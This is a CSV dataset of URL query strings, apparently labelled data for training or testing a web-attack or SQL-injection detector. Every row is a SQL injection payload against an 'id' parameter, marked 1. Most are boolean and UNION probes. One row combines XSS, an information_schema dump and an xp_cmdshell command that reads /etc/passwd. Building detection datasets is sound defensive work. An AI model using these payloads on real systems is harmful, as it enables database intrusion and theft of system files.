query,label
/?id=1'%20order%20by%201--%20-,1
"/?id=1&nWWI=9241%20AND%201%3D1%20UNION%20ALL%20SELECT%201,NULL,'<script>alert(""XSS"")</script>',table_name%20FROM%20information_schema.tables%20WHERE%202>1--/**/;%20EXEC%20xp_cmdshell('cat%20../../../etc/passwd')%23",1
/?id=1'%20or%201=1--%20-,1
/?id=4489'%20and%201=0--%20-,1
"/?id=1())(("".)'.",1
"/?id=1'snCCjI<'"">PQOXnA",1
/?id=1)%20AND%204835%3D9562--%20egHS,1
/?id=1)%20AND%206595%3D8354%20AND%20(9323%3D9323,1
/?id=1))%20AND%206945%3D4321%20AND%20((1586%3D1586,1
/?id=1)))%20AND%202261%3D7216%20AND%20(((9254%3D9254,1
/?id=1%20AND%202443%3D5649,1
/?id=1%20AND%207593%3D3788--%20xkyv,1
/?id=1%20AND%201990%3D1737%23%20BMum,1
/?id=1)%20WHERE%207193%3D7193%20AND%203471%3D3382--%20ZKlC,1
/?id=1%20WHERE%201710%3D1710%20AND%209115%3D8129--%20ebbw,1
/?id=1%2B(SELECT%20HEum%20WHERE%203385%3D3385%20AND%207198%3D7869)%2B,1
/?id=1))%20AS%20PIsz%20WHERE%202980%3D2980%20AND%207911%3D3636--%20ipUC,1
/?id=1)%20AS%20vRPQ%20WHERE%208437%3D8437%20AND%201616%3D7065--%20VQTD,1
/?id=1`%20WHERE%202391%3D2391%20AND%209169%3D1675--%20kbcX,1
/?id=1`)%20WHERE%202144%3D2144%20AND%203786%3D6938--%20SeIA,1
/?id=1`%3D`1`%20AND%201154%3D5000%20AND%20`1`%3D`1,1
/?id=1]-(SELECT%200%20WHERE%205192%3D5192%20AND%205398%3D1322)|[1,1
/?id=1')%20AND%208069%3D3318--%20RfBB,1
/?id=1'%20AND%203074%3D2707--%20EynL,1
"/?id=1""%20AND%204029%3D1979--%20JEpV",1
/?id=1')%20AND%203731%3D9868%20AND%20('KntK'%3D'KntK,1
/?id=1'))%20AND%204874%3D6499%20AND%20(('udTs'%3D'udTs,1
/?id=1')))%20AND%208631%3D3684%20AND%20((('vkam'%3D'vkam,1
/?id=1'%20AND%208247%3D9484%20AND%20'EYOt'%3D'EYOt,1
/?id=1')%20AND%205510%3D2684%20AND%20('Vtdl'%20LIKE%20'Vtdl,1
/?id=1'))%20AND%203677%3D1868%20AND%20(('sJXm'%20LIKE%20'sJXm,1
/?id=1')))%20AND%202724%3D8703%20AND%20((('aIfY'%20LIKE%20'aIfY,1
/?id=1%25'%20AND%206442%3D5393%20AND%20'hGhV%25'%3D'hGhV,1
/?id=1'%20AND%209799%3D7444%20AND%20'Eqvy'%20LIKE%20'Eqvy,1
"/?id=1"")%20AND%203115%3D8243%20AND%20(""huyZ""%3D""huyZ",1
"/?id=1""))%20AND%206668%3D6822%20AND%20((""lhlc""%3D""lhlc",1
"/?id=1"")))%20AND%204163%3D7155%20AND%20(((""sIgm""%3D""sIgm",1
"/?id=1""%20AND%205077%3D9795%20AND%20""Eqae""%3D""Eqae",1
"/?id=1"")%20AND%201509%3D1599%20AND%20(""kSft""%20LIKE%20""kSft",1
"/?id=1""))%20AND%208751%3D6009%20AND%20((""wcvf""%20LIKE%20""wcvf",1
"/?id=1"")))%20AND%201111%3D8148%20AND%20(((""QyBz""%20LIKE%20""QyBz",1
"/?id=1""%20AND%208518%3D5272%20AND%20""smDr""%20LIKE%20""smDr",1
/?id=1'%20AND%209958%3D6345%20OR%20'yOXu'%3D'MZIM,1
/?id=1')%20WHERE%201264%3D1264%20AND%201865%3D5450--%20yHEz,1
"/?id=1"")%20WHERE%208849%3D8849%20AND%205967%3D3379--%20Xikr",1
/?id=1'%20WHERE%209324%3D9324%20AND%204776%3D2559--%20RpmZ,1
"/?id=1""%20WHERE%207957%3D7957%20AND%209823%3D9969--%20FTJq",1
/?id=1'||(SELECT%20SBbu%20WHERE%204407%3D4407%20AND%203561%3D1260)||',1
/?id=1'||(SELECT%20WjiC%20FROM%20DUAL%20WHERE%202277%3D2277%20AND%209470%3D6463)||',1
/?id=1'%2B(SELECT%20WBpU%20WHERE%201990%3D1990%20AND%205546%3D8150)%2B',1
/?id=1||(SELECT%20gXsp%20FROM%20DUAL%20WHERE%207665%3D7665%20AND%208411%3D3068)||,1
/?id=1||(SELECT%20sTiC%20WHERE%205455%3D5455%20AND%201702%3D1970)||,1
/?id=1'))%20AS%20THET%20WHERE%201979%3D1979%20AND%209006%3D8843--%20DNkP,1
"/?id=1""))%20AS%20QotI%20WHERE%204986%3D4986%20AND%204156%3D3667--%20PoWb",1
/?id=1')%20AS%20xvoz%20WHERE%201878%3D1878%20AND%202972%3D4191--%20jzsb,1
"/?id=1"")%20AS%20PxYa%20WHERE%206919%3D6919%20AND%206189%3D6164--%20afpJ",1
"/?id=1""%3D""1""%20AND%205678%3D8233%20AND%20""1""%3D""1",1
/?id=1'%20IN%20BOOLEAN%20MODE)%20AND%205458%3D8969%23,1
/?id=-1047'%20UNION%20SELECT%201%2C2%2C2%2C3--%20-,1
/?id=-8439)%20OR%207870%3D3740--%20EZoa,1
/?id=-5583)%20OR%209708%3D9708--%20cNdy,1
/?id=-2483)%20OR%208406%3D8868%20AND%20(5057%3D5057,1
/?id=-9429)%20OR%209708%3D9708%20AND%20(1264%3D1264,1
/?id=-1172))%20OR%201274%3D4504%20AND%20((9879%3D9879,1
/?id=-6482))%20OR%209708%3D9708%20AND%20((9389%3D9389,1
/?id=-1570)))%20OR%204183%3D3558%20AND%20(((1722%3D1722,1
/?id=-9821)))%20OR%209708%3D9708%20AND%20(((4667%3D4667,1
/?id=-1352%20OR%201455%3D3305,1
/?id=-6991%20OR%209708%3D9708,1
/?id=-9056%20OR%208531%3D2145--%20kiGa,1
/?id=-4370%20OR%209708%3D9708--%20tgGq,1
/?id=-8386%20OR%201697%3D8450%23%20wjAg,1
/?id=-3006%20OR%209708%3D9708%23%20TDTR,1
/?id=-5721)%20WHERE%207897%3D7897%20OR%208577%3D9125--%20MuEQ,1
/?id=-3025)%20WHERE%207522%3D7522%20OR%209708%3D9708--%20xDfZ,1
/?id=-4955%20WHERE%206850%3D6850%20OR%201245%3D2239--%20Ejga,1
/?id=-6416%20WHERE%208377%3D8377%20OR%209708%3D9708--%20XSDy,1
/?id=-6190))%20AS%20fvYm%20WHERE%201391%3D1391%20OR%209837%3D2187--%20koWQ,1
/?id=-4649))%20AS%20UzAG%20WHERE%209116%3D9116%20OR%209708%3D9708--%20sxxg,1
/?id=-7924)%20AS%20vWHV%20WHERE%207113%3D7113%20OR%204753%3D3754--%20mozk,1
/?id=-6657)%20AS%20buLw%20WHERE%205056%3D5056%20OR%209708%3D9708--%20rCwo,1
/?id=-3518')%20OR%206573%3D7674--%20ZqEs,1
/?id=-1299')%20OR%209708%3D9708--%20meTF,1
/?id=-3537'%20OR%205837%3D8625--%20SqBK,1
/?id=-2073'%20OR%209708%3D9708--%20SxFb,1
"/?id=-8832""%20OR%205195%3D1051--%20bMsB",1
"/?id=-6509""%20OR%209708%3D9708--%20HgqU",1
/?id=-3862')%20OR%204625%3D1738%20AND%20('kLvy'%3D'kLvy,1
/?id=-7601')%20OR%209708%3D9708%20AND%20('eaJc'%3D'eaJc,1
/?id=-6366'))%20OR%207220%3D4374%20AND%20(('Fuqg'%3D'Fuqg,1
/?id=-9450'))%20OR%209708%3D9708%20AND%20(('zHVU'%3D'zHVU,1
/?id=-7946')))%20OR%205982%3D4314%20AND%20((('tNwD'%3D'tNwD,1
/?id=-4196')))%20OR%209708%3D9708%20AND%20((('UhLX'%3D'UhLX,1
/?id=-8205'%20OR%208061%3D8662%20AND%20'kIDB'%3D'kIDB,1
/?id=-8382'%20OR%209708%3D9708%20AND%20'vgaa'%3D'vgaa,1
/?id=-1215')%20OR%209038%3D9225%20AND%20('BOJA'%20LIKE%20'BOJA,1
/?id=-8253')%20OR%209708%3D9708%20AND%20('zwma'%20LIKE%20'zwma,1
/?id=-9245'))%20OR%205573%3D8256%20AND%20(('jhvU'%20LIKE%20'jhvU,1
/?id=-9933'))%20OR%209708%3D9708%20AND%20(('djSl'%20LIKE%20'djSl,1
/?id=-4601')))%20OR%201919%3D8949%20AND%20((('qvSM'%20LIKE%20'qvSM,1
